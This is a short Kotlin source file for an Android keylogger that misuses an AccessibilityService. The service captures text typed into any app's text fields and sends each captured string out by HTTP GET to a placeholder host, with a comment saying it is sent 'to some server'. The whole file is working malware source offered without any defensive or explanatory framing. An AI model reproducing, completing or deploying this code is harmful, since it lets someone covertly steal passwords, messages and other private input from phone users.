package com.example.androidkeylogger

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import java.net.HttpURLConnection
import java.net.URL

class KeylogService: AccessibilityService() {
    private fun sendTextHttp(text: CharSequence) {
        val url = URL("http://blablanonexistentblabla2358235gs?text=$text")
        val resp = url.openConnection()
        val respCode = (resp as HttpURLConnection).responseCode

        Log.i("RESP_CODE", "$respCode")
    }

    //Now we need to send this over HTTP to some server.
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val text: MutableList<CharSequence>? = event?.text
        val latestText: CharSequence = text?.get(0) as CharSequence

        val t = Thread(Runnable {
            Thread.sleep(1000)
            sendTextHttp(latestText)
        })

        t.start()
    }

    override fun onInterrupt() {
        Log.e("INTERRUPT", "Got interrupt")
    }

    override fun onServiceConnected() {
        val info = serviceInfo
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN
        info.notificationTimeout = 100
        this.serviceInfo = info
    }
}
